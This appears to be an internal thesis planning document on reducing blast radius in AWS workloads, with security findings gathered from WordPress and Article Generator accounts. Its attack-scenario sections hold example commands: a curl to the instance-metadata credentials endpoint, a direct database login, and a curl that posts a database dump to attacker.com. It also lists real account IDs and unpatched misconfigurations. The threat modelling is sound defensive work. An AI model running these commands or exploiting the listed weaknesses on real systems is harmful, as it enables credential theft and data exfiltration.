# Fabian's Suggestion — Workload Hardening & Blast Radius Reduction

---

## The Problem Fabian Sees

Forget about account-to-account for a moment (that's being handled by the Transit Gateway team). The real question is: **inside one account, inside one workload — if an attacker gets in, how far can they go?**

Take your Article Generator service (or WordPress). It probably runs like this:

```
Article Generator (one AWS account)
├── Compute: ECS containers or EC2 instances running the app
├── Database: DynamoDB or RDS storing articles/content
├── Storage: S3 bucket for images/assets
├── Queue: SQS for async processing
├── IAM Role: attached to the compute, with some set of permissions
└── Network: sits in a VPC with security groups
```

**The question Fabian is asking:** If an attacker gets code execution on that ECS container (through a vulnerable dependency, a supply chain attack, an SSRF vulnerability) — what can they reach?

**The answer today is probably:** Everything. The IAM role probably has broad permissions. The security group probably allows outbound to the internet. The container can probably reach the database, S3, SQS, and maybe other services it doesn't need.

**Fabian wants you to prove:** After your thesis work, the attacker is stuck. They got into the container, but they can't reach the database (because the IAM role doesn't have those permissions), can't reach the internet (because there's no egress route), can't reach other services (because the security group only allows specific connections).

---

## What Fabian Wants You to Do

### 1. Pick ONE Real Production Workload

Two candidates suggested:

| Workload | Stack | Why It's Good for This |
|---|---|---|
| **WordPress** | EC2/ECS + MySQL/RDS + S3 + public-facing | Classic web app, clear attack surface (public admin panel, plugins), well-understood threat model |
| **Article Generator** | More modern stack (Lambda/ECS + DynamoDB + S3 + SQS) | Fine-grained permissions are easier to demonstrate, internal expertise available to review weaknesses, less legacy baggage |

**Fabian's recommendation:** Article Generator is probably better — more modern, easier to apply fine-grained controls, and there are people internally who know the system well enough to help you identify weaknesses.

### 2. Model 2-3 Realistic Attack Scenarios

For each scenario, you answer: "The attacker got in through X. What can they reach? What damage can they do?"

**Scenario 1: Compromised Compute (Code Execution)**
```
How the attacker gets in:
  - Vulnerable dependency (e.g., Log4j-style RCE in a library)
  - SSRF vulnerability that allows code execution
  - Supply chain attack (malicious package in your dependencies)

What the attacker has:
  - Shell access on the container/EC2 instance
  - Access to the IAM role credentials (available via instance metadata)
  - Network access to whatever the security group allows

Questions to answer:
  - Can they reach the database? (network + IAM)
  - Can they reach S3 buckets they don't need?
  - Can they reach the internet to exfiltrate data?
  - Can they reach other services in the same VPC?
  - Can they escalate IAM privileges?
```

**Scenario 2: Stolen IAM Credentials**
```
How the attacker gets them:
  - Leaked in logs (accidentally printed to CloudWatch)
  - Extracted via SSRF to instance metadata endpoint
  - Found in a public Git repo

What the attacker has:
  - The IAM role's access key/session token
  - Can make AWS API calls from anywhere (not limited to the VPC)

Questions to answer:
  - What API calls can they make? (s3:*, dynamodb:*, iam:*?)
  - Can they read data from other services' S3 buckets?
  - Can they modify infrastructure (create new resources, change policies)?
  - Can they create new IAM users/roles for persistent access?
```

**Scenario 3: Compromised Dependency (Supply Chain)**
```
How it happens:
  - A package you depend on gets a malicious update
  - The malicious code runs inside your application process

What the attacker has:
  - Same as Scenario 1 (code execution), but more subtle
  - May try to be stealthy (exfiltrate data slowly, not crash the service)

Questions to answer:
  - Can the malicious code phone home (internet egress)?
  - Can it read environment variables / secrets?
  - Can it access resources beyond what the application needs?
```

### 3. Implement Least-Privilege Controls

For each scenario, implement controls that limit the blast radius:

| Control | What It Does | Which Scenario It Helps |
|---|---|---|
| **Tight Security Groups** | Only allow outbound to specific destinations (database port, S3 endpoint) — no 0.0.0.0/0 | Scenario 1, 3 (blocks internet egress) |
| **VPC Endpoints** | Access S3/DynamoDB/SQS through private endpoints, remove NAT Gateway route | Scenario 1, 3 (eliminates internet path) |
| **Least-Privilege IAM** | IAM role only allows the exact API calls the service makes (e.g., `dynamodb:GetItem` on one table, not `dynamodb:*` on `*`) | Scenario 2 (limits what stolen creds can do) |
| **IMDSv2 Required** | Force Instance Metadata Service v2 (requires token) — blocks simple SSRF credential theft | Scenario 2 (makes credential theft harder) |
| **Permission Boundaries** | Cap on what the IAM role can ever do, even if someone attaches a broader policy | Scenario 2 (prevents privilege escalation) |
| **SCPs** | Organization-level rules: no wildcard permissions, no disabling CloudTrail | All scenarios (safety net) |
| **Network segmentation** | Separate subnet for database, security group only allows app → database on specific port | Scenario 1 (blocks lateral movement to other services) |

### 4. Validate with Testing

Actually test the attack scenarios:

```
Test 1: From inside the container, try to reach the database directly
  BEFORE: ✅ Connection succeeds (too broad SG)
  AFTER:  ❌ Connection refused (SG only allows app → DB on port 5432)

Test 2: From inside the container, try to reach the internet
  BEFORE: ✅ curl google.com works (NAT Gateway route exists)
  AFTER:  ❌ Connection timeout (no internet route, only VPC endpoints)

Test 3: Using the IAM role, try to list all S3 buckets
  BEFORE: ✅ Returns all 50 buckets in the account
  AFTER:  ❌ Access Denied (policy only allows access to one specific bucket)

Test 4: Using the IAM role, try to create a new IAM user
  BEFORE: ✅ User created (role has broad permissions)
  AFTER:  ❌ Access Denied (permission boundary blocks IAM write actions)

Test 5: Try to access instance metadata without IMDSv2 token
  BEFORE: ✅ Credentials returned (IMDSv1 allows simple GET)
  AFTER:  ❌ 401 Unauthorized (IMDSv2 requires PUT token first)
```

### 5. Produce Reusable Patterns

The thesis doesn't just harden one workload — it produces artifacts other teams can use:

- **Security checklist:** "Before deploying a new service, verify these 15 things"
- **SCP templates:** Organization-wide guardrails (no wildcard SGs, no public S3 buckets, IMDSv2 required)
- **IAM policy templates:** Least-privilege patterns for common service types (web app, data processor, API backend)
- **Architecture patterns:** "This is how to set up a service with Zero Trust networking"
- **Documentation:** Step-by-step guide for other teams to harden their workloads

---

## What This Looks Like as a Thesis

### Research Questions
1. What is the current blast radius if the Article Generator's compute is compromised? (How many resources/services are reachable?)
2. Can least-privilege network + identity controls reduce the blast radius to only direct dependencies?
3. What is the operational impact of implementing these controls? (Does anything break?)
4. Can the hardening patterns be generalized into reusable templates for other workloads?

### Phase A (Weeks 1-8): Assessment
- Map the Article Generator's architecture (compute, storage, database, queues, IAM roles, network)
- Document all dependencies: what does this service actually need to talk to?
- Analyze current permissions: what can the IAM role do? What does the security group allow?
- Calculate current blast radius: if compromised, what's reachable?
- Define 2-3 attack scenarios with expected outcomes

### Phase B (Weeks 9-16): Implementation
- Implement least-privilege IAM policies (based on actual usage from CloudTrail)
- Implement tight security groups (only allow connections to direct dependencies)
- Deploy VPC endpoints, remove internet egress
- Enforce IMDSv2
- Implement permission boundaries
- Test all 3 attack scenarios (before vs after)
- Measure blast radius reduction
- Write reusable patterns and documentation

### Deliverables
- Blast radius analysis (before/after with specific numbers)
- Implemented controls on Article Generator
- Attack scenario test results (5+ tests, all passing)
- Reusable security checklist
- SCP templates for organization
- IAM policy templates
- Architecture pattern documentation
- Thesis document with quantitative evaluation

### Key Metrics

| Metric | Before | After | How Measured |
|---|---|---|---|
| Reachable services from compromised compute | ~80% of account resources | <10% (only direct dependencies) | Network reachability test |
| IAM permissions (granted vs used) | Hundreds of allowed actions | Only the 10-20 actually used | IAM Access Analyzer |
| Internet egress paths | Yes (NAT Gateway) | No (VPC endpoints only) | Route table + connectivity test |
| Credential theft via SSRF | Possible (IMDSv1) | Blocked (IMDSv2 required) | Metadata endpoint test |
| Privilege escalation possible | Yes (broad IAM) | No (permission boundary) | IAM Policy Simulator |

---

## Pros and Cons

### Pros
- **Perfect thesis scope** — one workload, 2-3 scenarios, clear before/after measurement
- **No overlap with Transit Gateway work** — Fabian explicitly designed this to avoid that conflict
- **Strong academic narrative** — "I hypothesized that least-privilege controls reduce blast radius. I implemented them. Here's the measured reduction." That's a textbook thesis structure
- **Measurable results** — blast radius percentage, number of blocked paths, specific test results
- **Reusable output** — patterns and templates benefit the whole organization
- **Completable in 3-4 months** — tightly scoped, no dependency on other teams
- **Combines networking + identity** — security groups + IAM + VPC endpoints = strong technical depth

### Cons
- **Smaller organizational scope** — only one workload, not all accounts
- **Depends on workload access** — you need permission to modify the Article Generator's infrastructure
- **Less "visible" to leadership** — "I hardened one service" sounds smaller than "I built a governance platform" (even though it's better thesis work)

---

## When to Choose This

Choose Fabian's approach if:
- You want a thesis that's clearly completable in 3-4 months
- You want measurable before/after results (blast radius reduction)
- You want to avoid overlap with ongoing Transit Gateway work
- You want something your thesis advisor will immediately understand as "research"
- You want to produce reusable patterns that help the whole org (not just one dashboard)
- You're comfortable picking one workload and going deep rather than going broad

---

## Simple Analogy

**Think of it like home security:**
- You pick ONE room in your house (the home office)
- You model threats: "What if a burglar gets in through the window?"
- You implement controls: lock the filing cabinet, put the safe behind a code, remove the spare key from under the mat
- You test: try to open the filing cabinet without the key (blocked), try to access the safe without the code (blocked)
- You measure: before, burglar could access 10 things. After, burglar can access 1 thing (the desk, which has nothing valuable)
- You write a guide so every room in the house can be secured the same way

---

## Comparison: Sebastian vs Fabian (Quick Reference)

| | Sebastian | Fabian |
|---|---|---|
| **Scope** | All accounts (broad) | One workload (deep) |
| **Question** | "Can Account A reach Account B?" | "If this container is hacked, what can the attacker reach?" |
| **Output** | Dashboard + governance workflow | Security controls + test results + reusable patterns |
| **Thesis-friendly** | Harder (more tooling than research) | Easier (clear hypothesis → experiment → results) |
| **Time risk** | High (can balloon) | Low (tightly bounded) |
| **Overlap risk** | Medium (Transit Gateway work) | Low (explicitly avoids it) |
| **Measurability** | Harder ("we built a dashboard") | Easier ("blast radius reduced from 80% to 5%") |

---

*This is Fabian's suggestion for Topic 1, focused on workload hardening with measurable blast radius reduction.*


---

## Gathered Data: WordPress Dev Account

**Account:** 851725424182 | **Region:** eu-central-1 | **Deployed via:** CDK (WordpressStack)  
**Date Gathered:** 8 June 2026

---

### Architecture Overview

```
Internet
    │
    ▼
┌─────────────────────────────────────────────────────┐
│  VPC: 10.0.0.0/16                                   │
│                                                     │
│  Public Subnets (10.0.0.0/24, 10.0.1.0/24)         │
│  ├── Internet Gateway (igw-04d18b15b022ffdb5)       │
│  └── NAT Gateway (nat-01ce085f0b97fe4cd)            │
│           │                                         │
│  Private Subnets (10.0.2.0/24, 10.0.3.0/24)        │
│  ├── EC2 (t3.micro) - WordPress - 10.0.2.129       │
│  ├── RDS MySQL 8.0 (db.t4g.micro) - wordpressdb    │
│  └── VPC Endpoints (SSM, SSMMessages, EC2Messages)  │
└─────────────────────────────────────────────────────┘
```

---

### Compute (EC2)

| Property | Value |
|---|---|
| Instance ID | i-0914b1edb40711574 |
| Type | t3.micro |
| Private IP | 10.0.2.129 |
| Public IP | None |
| Subnet | Private (subnet-00d33fb39bccb55b1, eu-central-1a) |
| IAM Role | WordpressStack-MyInstanceRoleBF418E71-zGqTXv1yc3fz |
| IMDSv2 Enforced? | ❌ NO (HttpTokens: optional) |
| Key Pair | SSH_TUNNEL |

---

### IAM Role Permissions

**Role:** WordpressStack-MyInstanceRoleBF418E71-zGqTXv1yc3fz

**Attached Managed Policies:**
- `AmazonSSMManagedInstanceCore` — allows SSM agent communication
- `AmazonSSMPatchAssociation` — allows patch management

**Inline Policies:** None

**Assessment:** Relatively narrow IAM permissions (SSM only). However, SSM can be abused to run commands on other managed instances if they exist.

---

### Security Groups

**EC2 Security Group (sg-0194f0c6af84d86d3):**

| Direction | Protocol | Port | Source/Destination | Issue? |
|---|---|---|---|---|
| Inbound | TCP | 22 (SSH) | 0.0.0.0/0 | ⚠️ Open to world (mitigated: private subnet, no public IP) |
| Inbound | TCP | 443 (HTTPS) | 10.0.0.0/16 (VPC) | ✅ OK |
| Outbound | ALL | ALL | 0.0.0.0/0 | 🚨 Fully open egress |

**RDS Security Group (sg-05ed4a22c1af30e4b):**

| Direction | Protocol | Port | Source/Destination | Issue? |
|---|---|---|---|---|
| Inbound | TCP | 3306 (MySQL) | 0.0.0.0/0 | 🚨 Database accessible from anywhere |
| Outbound | ALL | ALL | 0.0.0.0/0 | 🚨 Fully open egress |

---

### Network / Egress

| Component | Status | Issue? |
|---|---|---|
| Internet Gateway | Attached to VPC | Used by public subnets |
| NAT Gateway | nat-01ce085f0b97fe4cd (PublicSubnet1) | 🚨 Gives private subnet instances internet access |
| Private subnet route | 0.0.0.0/0 → NAT Gateway | 🚨 Allows data exfiltration to internet |
| Public subnet route | 0.0.0.0/0 → Internet Gateway | Expected for public subnets |

---

### VPC Endpoints

| Endpoint | Service | Policy | Issue? |
|---|---|---|---|
| vpce-04cace983a4ef2e42 | com.amazonaws.eu-central-1.ssm | Allow * on * for * | 🚨 Wildcard — any principal, any action |
| vpce-026fa51a27911c969 | com.amazonaws.eu-central-1.ssmmessages | Allow * on * for * | 🚨 Wildcard |
| vpce-0cb80532af179bd38 | com.amazonaws.eu-central-1.ec2messages | Allow * on * for * | 🚨 Wildcard |

**Missing Endpoints:** No S3 endpoint, no RDS endpoint — traffic to S3 goes through NAT Gateway (internet).

---

### Database (RDS)

| Property | Backup Instance | Restored Instance |
|---|---|---|
| Identifier | ...-dev-backup | ...-rdsrestored-... |
| Engine | MySQL 8.0.44 | MySQL 8.0.44 |
| Class | db.t4g.micro | db.t4g.micro |
| Storage Encrypted | ❌ NO | ✅ YES |
| IAM DB Auth | ❌ Disabled | ❌ Disabled |
| Publicly Accessible | No | No |
| Multi-AZ | No | No |
| Deletion Protection | ❌ No | ❌ No |
| Security Group | sg-05ed4a22c1af30e4b (3306 from 0.0.0.0/0) | Same |

---

### S3 Buckets (15 total)

| Bucket | Purpose |
|---|---|
| cdk-hnb659fds-assets-851725424182-eu-central-1 | CDK deployment assets |
| do-not-delete-ssm-diagnosis-... | SSM diagnostics |
| dyn-blog-access-log | Access logs |
| ssh-key-851725424182 | ⚠️ SSH key storage |
| wordpress-media-851725424182 | Media files |
| wordpress-media-files-851725424182 | Media files |
| wordpress-media-files-...-1763399666684 | Media files (variant) |
| wordpress-media-files-...-1763456645202 | Media files (variant) |
| wordpress-media-files-...-1763457445864 | Media files (variant) |
| wordpress-media-files-...-1763457857807 | Media files (variant) |
| wordpress-media-files-...-1763458206846 | Media files (variant) |
| wordpress-media-files-...-1763458616205 | Media files (variant) |
| wordpress-media-files-...-1763459791778 | Media files (variant) |
| wordpress-media-files-...-1763741118244 | Media files (variant) |
| wordpress-media-files-...-1763973552741 | Media files (variant) |

---

### 🚨 Security Findings Summary (Thesis "Before" State)

| # | Finding | Severity | Attack Scenario |
|---|---|---|---|
| 1 | IMDSv1 enabled (HttpTokens: optional) | HIGH | SSRF → credential theft |
| 2 | RDS SG allows 3306 from 0.0.0.0/0 | HIGH | Any VPC host can access DB |
| 3 | EC2 egress fully open (0.0.0.0/0) | HIGH | Data exfiltration via NAT |
| 4 | NAT Gateway provides internet egress | MEDIUM | Exfiltration path exists |
| 5 | VPC endpoint policies are wildcard (*) | MEDIUM | Over-permissive access |
| 6 | SSH SG from 0.0.0.0/0 | MEDIUM | Broad (mitigated by private subnet) |
| 7 | RDS storage not encrypted (backup) | MEDIUM | Data at rest unprotected |
| 8 | IAM DB auth disabled | MEDIUM | No credential rotation via IAM |
| 9 | SSH key in S3 bucket | MEDIUM | Key management concern |
| 10 | No S3 VPC endpoint | LOW | S3 traffic goes via internet |

---

### Attack Scenarios (Mapped to This Workload)

**Scenario 1: SSRF → Credential Theft → SSM Abuse**
```
WordPress plugin vulnerability (SSRF)
  → curl http://169.254.169.254/latest/meta-data/iam/security-credentials/...
  → Gets IAM role credentials (IMDSv1 allows this without token)
  → Attacker calls SSM APIs externally
  → Can potentially list/run commands on other managed instances
```

**Scenario 2: Compromised EC2 → Direct Database Access**
```
Attacker gets shell on EC2 (via plugin RCE or dependency exploit)
  → mysql -h wordpressstack-...rds.amazonaws.com -u admin -p
  → RDS SG allows 3306 from 0.0.0.0/0 — connection succeeds
  → Full access to wordpressdb (all posts, users, passwords)
```

**Scenario 3: Compromised EC2 → Data Exfiltration**
```
Attacker has shell + database dump
  → curl -X POST https://attacker.com/exfil -d @dump.sql
  → Egress SG allows all outbound, NAT Gateway routes to internet
  → Data leaves the network undetected
```

---

### Proposed Hardening Controls (Thesis "After" State)

| # | Control | Fixes Finding | Expected Impact |
|---|---|---|---|
| 1 | Enforce IMDSv2 (HttpTokens: required) | #1 | Blocks SSRF credential theft |
| 2 | Restrict RDS SG to EC2 SG only (port 3306) | #2 | Only WordPress EC2 can reach DB |
| 3 | Restrict EC2 egress to specific destinations | #3 | Block arbitrary internet access |
| 4 | Remove NAT Gateway, add S3 VPC endpoint | #4, #10 | Eliminate internet egress path |
| 5 | Scope VPC endpoint policies to this role/account | #5 | Least-privilege endpoint access |
| 6 | Replace SSH SG with SSM-only access | #6 | Remove SSH attack surface entirely |
| 7 | Enable RDS encryption | #7 | Protect data at rest |
| 8 | Enable IAM DB authentication | #8 | Rotate credentials automatically |
| 9 | Add permission boundary to IAM role | — | Prevent privilege escalation |

---

### Blast Radius: Before vs After (Expected)

| Resource | Before (Reachable?) | After (Reachable?) |
|---|---|---|
| RDS MySQL | ✅ Yes (from anywhere) | Only from WordPress EC2 |
| Internet | ✅ Yes (via NAT) | ❌ Blocked |
| S3 (all buckets) | ⚠️ Via internet (NAT) | Only via VPC endpoint (scoped) |
| SSM (other instances) | ✅ Yes (role allows) | Scoped with permission boundary |
| Other VPC resources | ✅ Yes (open egress) | ❌ Blocked by restricted egress SG |
| Instance metadata creds | ✅ Stealable (IMDSv1) | ❌ Blocked (IMDSv2 required) |


---

## Gathered Data: WordPress Prod Account

**Account:** 851725489819 | **Region:** eu-central-1 | **Deployed via:** CDK (WordpressStack)  
**Date Gathered:** 8 June 2026

---

### Architecture Overview

```
Internet
    │
    ▼
┌─────────────────────────────────────────────────────────┐
│  VPC: 10.0.0.0/16                                       │
│                                                         │
│  Public Subnets (10.0.0.0/24, 10.0.1.0/24)             │
│  ├── Internet Gateway (igw-031ff855163cd87dc)           │
│  ├── NAT Gateway 1 (nat-07bb719589488ea63, PublicSub1)  │
│  └── NAT Gateway 2 (nat-051a39d06d6c17f75, PublicSub2)  │
│           │                                             │
│  Private Subnets (10.0.2.0/24, 10.0.3.0/24)            │
│  ├── EC2 (t3.micro) - WordPress - 10.0.2.54            │
│  └── RDS MySQL 8.0 (db.t4g.micro) - Multi-AZ           │
│                                                         │
│  ⚠️ NO VPC Endpoints                                    │
└─────────────────────────────────────────────────────────┘
```

---

### Compute (EC2)

| Property | Value |
|---|---|
| Instance ID | i-0935a222b51c6ca78 |
| Type | t3.micro |
| Private IP | 10.0.2.54 |
| Public IP | None |
| Subnet | Private (subnet-046cb93f566670a5b, eu-central-1a) |
| IAM Role | WordpressStack-MyInstanceRoleBF418E71-CCwUh7U2MYYt |
| IMDSv2 Enforced? | ❌ NO (HttpTokens: optional) |
| Key Pair | SSH_TUNNEL |
| Running Since | 2026-05-13 |

---

### IAM Role Permissions

**Role:** WordpressStack-MyInstanceRoleBF418E71-CCwUh7U2MYYt

**Attached Managed Policies:**
- `AmazonSSMManagedInstanceCore` — allows SSM agent communication
- `AmazonSSMPatchAssociation` — allows patch management

**Inline Policies:** None

**Assessment:** Same as dev — relatively narrow (SSM only), but still vulnerable to SSRF credential theft via IMDSv1.

---

### Security Groups

**EC2 Security Group (sg-07eae0c0fd941841d):**

| Direction | Protocol | Port | Source/Destination | Issue? |
|---|---|---|---|---|
| Inbound | — | — | None (no inbound rules!) | ✅ Good — no direct inbound |
| Outbound | ALL | ALL | 0.0.0.0/0 | 🚨 Fully open egress |

**RDS Security Group 1 (sg-095893b787af30460) — "RdsSecurityGroup":**

| Direction | Protocol | Port | Source/Destination | Issue? |
|---|---|---|---|---|
| Inbound | TCP | 3306 | 0.0.0.0/0 | 🚨 Database accessible from anywhere |
| Outbound | ALL | ALL | 0.0.0.0/0 | 🚨 Fully open egress |

**RDS Security Group 2 (sg-07c453683323fe0cd) — "rds-ec2-1":**

| Direction | Protocol | Port | Source/Destination | Issue? |
|---|---|---|---|---|
| Inbound | TCP | 3306 | sg-00f2822aaaf57df10 (specific EC2 SG) | ✅ Good — SG-to-SG reference |
| Outbound | — | — | None | ✅ OK |

**Note:** RDS has TWO security groups. One is properly scoped (sg-to-sg), but the other allows 3306 from 0.0.0.0/0, which overrides the protection.

---

### Network / Egress

| Component | Status | Issue? |
|---|---|---|
| Internet Gateway | igw-031ff855163cd87dc | Used by public subnets |
| NAT Gateway 1 | nat-07bb719589488ea63 (PublicSubnet1, 3.125.29.8) | 🚨 Internet egress for PrivateSubnet1 |
| NAT Gateway 2 | nat-051a39d06d6c17f75 (PublicSubnet2, 18.199.109.162) | 🚨 Internet egress for PrivateSubnet2 |
| Private subnet 1 route | 0.0.0.0/0 → NAT Gateway 1 | 🚨 Data exfiltration path |
| Private subnet 2 route | 0.0.0.0/0 → NAT Gateway 2 | 🚨 Data exfiltration path |

**Note:** Prod has 2 NAT Gateways (one per AZ) — more resilient but doubles the egress concern.

---

### VPC Endpoints

**⚠️ NONE — No VPC endpoints in production!**

All AWS service access (S3, SSM, etc.) goes through NAT Gateway → public internet. This is worse than dev, which at least has SSM endpoints.

---

### Database (RDS) — 3 Instances

| Property | Primary | Restored #1 | Restored #2 |
|---|---|---|---|
| Identifier | ...-pir1sjp84ftf | ...-3pmcbw077vm2 | ...-au7owyinpolx |
| Engine | MySQL 8.0.44 | MySQL 8.0.44 | MySQL 8.0.44 |
| Class | db.t4g.micro | db.t4g.micro | db.t4g.micro |
| Multi-AZ | ✅ YES | ✅ YES | ✅ YES |
| Storage Encrypted | ❌ NO | ❌ NO | ❌ NO |
| IAM DB Auth | ❌ Disabled | ❌ Disabled | ❌ Disabled |
| Deletion Protection | ✅ YES | ❌ NO | ❌ NO |
| Publicly Accessible | No | No | No |
| Created | 2024-03-11 | 2026-05-07 | 2026-05-07 |
| Tagged Backup | "hourly" | — | — |

---

### S3 Buckets (2 only — much cleaner than dev)

| Bucket | Purpose |
|---|---|
| cdk-hnb659fds-assets-851725489819-eu-central-1 | CDK deployment assets |
| wordpress-media-files-851725489819 | WordPress media files |

---

### 🚨 Security Findings Summary (Thesis "Before" State — Prod)

| # | Finding | Severity | Impact (PROD!) |
|---|---|---|---|
| 1 | **IMDSv1 enabled** (HttpTokens: optional) | 🔴 CRITICAL | SSRF → credential theft on production |
| 2 | **RDS SG allows 3306 from 0.0.0.0/0** | 🔴 CRITICAL | Production database exposed to entire VPC |
| 3 | **EC2 egress fully open (0.0.0.0/0)** | 🔴 CRITICAL | Production data can be exfiltrated |
| 4 | **No VPC endpoints at all** | HIGH | All AWS API calls go through internet |
| 5 | **2 NAT Gateways provide internet egress** | HIGH | Exfiltration path exists (redundant!) |
| 6 | **RDS storage NOT encrypted** (all 3 instances) | HIGH | Production data at rest unprotected |
| 7 | **IAM DB auth disabled** | MEDIUM | No credential rotation via IAM |
| 8 | **2 restored RDS instances without deletion protection** | MEDIUM | Could be accidentally deleted |

---

### Dev vs Prod Comparison

| Aspect | Dev | Prod | Assessment |
|---|---|---|---|
| Account | 851725424182 | 851725489819 | Different accounts ✓ |
| IMDSv2 | ❌ Not enforced | ❌ Not enforced | Same issue in both |
| RDS SG (0.0.0.0/0) | ❌ Open | ❌ Open (+ has a good SG too, but overridden) | Same issue — prod also has proper SG but it's negated |
| VPC Endpoints | ✅ 3 (SSM, SSMMessages, EC2Messages) | ❌ NONE | **Prod is worse** |
| NAT Gateways | 1 | 2 (one per AZ) | Prod has more egress paths |
| RDS Multi-AZ | ❌ No | ✅ Yes | Prod is more resilient |
| RDS Encryption | ❌ No (backup) / ✅ Yes (restored) | ❌ No (all 3!) | **Prod is worse** |
| RDS Deletion Protection | ❌ No | ✅ Yes (primary only) | Partial |
| EC2 Inbound SG | SSH from 0.0.0.0/0 | No inbound rules | **Prod is better** |
| S3 Buckets | 15 (cluttered) | 2 (clean) | Prod is cleaner |
| EC2 Egress | ❌ Open | ❌ Open | Same issue |
| Endpoint Policies | Wildcard (*) | N/A (no endpoints) | Dev has them but too permissive; prod doesn't have them at all |

---

### Key Insight for Thesis

**Production is in worse shape than dev for network security:**
- No VPC endpoints → all AWS API traffic goes through public internet
- All 3 RDS instances unencrypted
- Same SSRF vulnerability (IMDSv1)
- Same open database SG

This makes the thesis even more compelling — hardening these controls in prod has direct, measurable security impact on real production data.


---

## Gathered Data: Article Generator Dev Account

**Account:** 905418363445 | **Region:** eu-central-1 | **Deployed via:** CDK (VideoToArticleStack + multiple service stacks)  
**Date Gathered:** 8 June 2026

---

### Architecture Overview

This is a **serverless/event-driven** architecture — very different from WordPress:

```
┌──────────────────────────────────────────────────────────────┐
│  Article Generator Pipeline                                   │
│                                                              │
│  Video Source (S3)                                            │
│      │                                                       │
│      ▼                                                       │
│  Step Functions (MainPipeline, DynPipeline, HblPipeline)     │
│      │                                                       │
│      ├──► Lambda: TranscriptionAudioConversion (10GB memory) │
│      │        Uses AWS Batch (g4dn.xlarge GPU instances)      │
│      │                                                       │
│      ├──► Lambda: NERProcessor (Named Entity Recognition)    │
│      │        Uses Bedrock (Claude) + SecretsManager          │
│      │                                                       │
│      ├──► Lambda: PromptGenerationLambda                     │
│      │        Uses Bedrock (Claude Opus 4.5)                  │
│      │                                                       │
│      ├──► Lambda: ArticleGenerationLambda                    │
│      │        Uses Bedrock (Claude Opus 4.5) + S3             │
│      │                                                       │
│      ├──► Lambda: FactCheckTriggerLambda                     │
│      │        Calls external API (factcheck endpoint)         │
│      │                                                       │
│      └──► Lambda: PublishingService                           │
│               Publishes to DynamoDB (TextResults)             │
│                                                              │
│  REST API (API Gateway + Lambda)                              │
│      ├── PostArticle, GetEmail, PostEmail, DeleteEmail        │
│      └── PostPrompt, PostQualityPrompt                       │
│                                                              │
│  Monitoring                                                   │
│      ├── SNS: ArticleGeneratorAlerts                         │
│      └── Lambda: MissedGamesCheckerLambda                    │
│                                                              │
│  VPC (10.0.0.0/16) — Only used by AWS Batch compute          │
│      └── Transcription Batch jobs (g4dn.xlarge GPU)          │
└──────────────────────────────────────────────────────────────┘
```

---

### Compute

**Lambda Functions (16+):**
- All Lambda functions run **outside VPC** (no VPC config)
- Access AWS services over public internet by default
- IMDSv2 is enforced on Batch compute instances ✅

**AWS Batch (GPU Compute):**
- Instance type: g4dn.xlarge (GPU for transcription)
- Runs in VPC (vpc-01a0199d05e4d9e8d)
- Auto Scaling Group managed
- IMDSv2: required ✅ (HttpTokens: required)

---

### IAM Roles (Lambda — Key Concern)

Each Lambda has its own role. Key roles to investigate:

| Lambda | Role | Services Accessed |
|---|---|---|
| devPromptGenerationLambda | PromptGenerationLambdaSer-... | Bedrock, S3, DynamoDB |
| dev-NERProcessor | NERProcessorServiceRole... | Bedrock, DynamoDB, SecretsManager |
| dev-TranscriptionAudioConversion | TranscriptionAudioConvers-... | S3 (source + destination) |
| FactCheckTriggerLambda | FactCheckTriggerLambdaSer-... | SNS, external API |
| sepArticleGenerationLambda | ArticleGenerationLambdaSe-... | Bedrock, S3, DynamoDB |
| MissedGamesCheckerLambda | MissedGamesCheckerLambdaS-... | SNS, SecretsManager, Step Functions |

**Key observation:** Lambda functions access Bedrock, SecretsManager, DynamoDB, S3, and external APIs — need to verify how tightly these permissions are scoped.

---

### Security Groups

**Default VPC SG (sg-0e2d06a48314b5973):**

| Direction | Protocol | Port | Source/Destination | Issue? |
|---|---|---|---|---|
| Inbound | ALL | ALL | Self (same SG) | ✅ OK (self-referencing) |
| Outbound | ALL | ALL | 0.0.0.0/0 | 🚨 Fully open egress |

**Transcription Batch SG (sg-0c8378b3e41c6bf7a):**

| Direction | Protocol | Port | Source/Destination | Issue? |
|---|---|---|---|---|
| Inbound | TCP | 80 | 0.0.0.0/0 | ⚠️ HTTP from anywhere — why? |
| Outbound | ALL | ALL | 0.0.0.0/0 | 🚨 Fully open egress |

---

### VPC Endpoints

**⚠️ NONE — No VPC endpoints!**

Batch compute instances access S3 and other AWS services through NAT Gateway (public internet).

---

### Storage — DynamoDB Tables (8)

| Table | Purpose |
|---|---|
| TextResults | Main article text results |
| processing-jobs | Job tracking |
| publication-jobs | Publication workflow tracking |
| shared-jobs | Shared job state |
| fv-fv-runs | Fact verification runs |
| seb-TextResults | Developer sandbox |
| seb-shared-jobs | Developer sandbox |
| sep3-publication-jobs | Pipeline variant |

---

### Storage — S3 Buckets (13)

| Bucket | Purpose |
|---|---|
| videotoarticlestack-video-src-... | Video source input |
| videotoarticlestack-destination-... | Generated article output |
| nikvideotoarticlestack-video-src-... | Developer variant (Nik) |
| nikvideotoarticlestack-destination-... | Developer variant output |
| seb-videotoarticlestack-video-src-... | Developer variant (Seb) |
| seb-videotoarticlestack-destination-... | Developer variant output |
| sep3-videotoarticlestack-video-src-... | Pipeline variant |
| hbl-article-results-... | HBL article results |
| frontendstack-dynvideotoseotextbucket-... | Frontend SEO text |
| fabian-wurst-123-test-bucket | Test bucket (Fabian) |
| test-cloudtrail-234 | CloudTrail test |
| cdk-hnb659fds-assets-...-eu-central-1 | CDK assets |
| cdk-hnb659fds-assets-...-us-east-1 | CDK assets (cross-region) |

---

### Step Functions (11 State Machines)

| State Machine | Purpose |
|---|---|
| MainPipeline | Main article generation pipeline |
| MainPipelineRetryWrapper | Retry wrapper for resilience |
| DynPipeline | DYN-specific pipeline |
| HblPipeline | HBL-specific pipeline |
| GenerateArticlePipeline | Core article generation |
| sep-* (3 variants) | Developer branch (Sep) |
| sep3-* (3 variants) | Developer branch (Sep3) |

---

### External Integrations

| Integration | Access Method | Issue? |
|---|---|---|
| **Amazon Bedrock** (Claude Opus 4.5) | Lambda → Bedrock API (public) | ⚠️ No VPC endpoint |
| **SecretsManager** | Lambda → SM API (public) | ⚠️ No VPC endpoint |
| **External Factcheck API** | Lambda → HTTPS (amvamaomed.execute-api...) | ⚠️ External dependency |
| **SNS** | Lambda → SNS (public) | ⚠️ No VPC endpoint |

---

### SNS Topics

| Topic | Purpose |
|---|---|
| ArticleGeneratorAlerts | Pipeline failure alerts |
| CISAlarm | CIS benchmark alarms |
| aws-controltower-SecurityNotifications | Control Tower notifications |
| dev-TranscriptionServiceAlarms | Transcription service alerts |

---

